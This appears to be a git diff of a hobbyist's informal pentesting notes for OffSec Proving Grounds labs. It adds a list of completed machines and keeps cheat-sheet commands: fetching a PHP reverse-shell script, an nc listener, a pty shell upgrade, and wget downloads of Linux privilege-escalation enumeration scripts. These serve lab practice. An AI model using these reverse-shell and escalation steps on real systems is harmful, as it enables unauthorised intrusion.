@@ -4,7 +4,7 @@
     8888      d88P  888  888  888 8888  888 8888   | 888  888  
     Y888     d88P   888  888  888 Y888  888 Y888   | 888  888 
 .----"88__/ d88P___ 888  888  888  "88_/888  "88__/  888  888----.        
-|            -->   Z2V0IG9mZiBteSBsYXduIQ==   <--                |      															    	     														
+|             -->   Z2V0IG9mZiBteSBsYXduIQ==   <--               |      															    	     														
 '----------------------------------------------------------------'                 
  juss sum notes to get me started haxin on offsec provin grounds.
   
@@ -23,12 +23,13 @@ enum4linux -a *host*
 
 ----
 
-searchsploit    exploitdb from cli
+searchsploit  --  exploitdb from cli
 
 msfconsole
 
 ----
-::da phprev shell::
+
+::phprev shell::
 wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
 edit with host and nc port
 nc -vnlp port
@@ -40,7 +41,7 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 if you wanna be fancy... pfft :P
 
-export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp   <-- make yo life mo easy 
+export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp     <-- make yo life mo easy 
 export TERM=xterm-256color
 alias ll='ls -lsaht --color=auto'
 Ctrl + Z [Background Process]
@@ -62,19 +63,45 @@ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
 
 wget https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py
 
-https://gtfobins.github.io   this sum magic
+https://gtfobins.github.io  --  this sum magic
 
 ::this hoe happen sumtimes trying to run scipts::
 /bin/bash^M: bad interpreter: No such file or directory
 ::this getchu gucci::
 sed -i -e 's/\r$//' *file*
 
-juss some baics to get goin. prob add more as i advance. lego!!
+----
+PLAY
+::warm up labs completed::
+BBSCute
+CyberSploit1
+Dawn
+FunboxEasy
+FunboxEasyEnum	
+FunboxRookie
+Gaara
+Geisha	
+Inclusiveness
+InfosecPrep	
+Katana	
+Lampiao	
+Monitoring
+OnSystemShellDredd	
+Potato
+Sar	
+Seppuku	
+Shakabrah
+Sumo
+SunsetNoontide
+Wpwn
 
+::get to work labs completed::
+Funbox
 
+::try harder labs completed::
 
+----
 
-
-
-
-an remember always bump da PHONK while you hax.. vibes
+PRACTICE
+::warm up::
+Fantastic
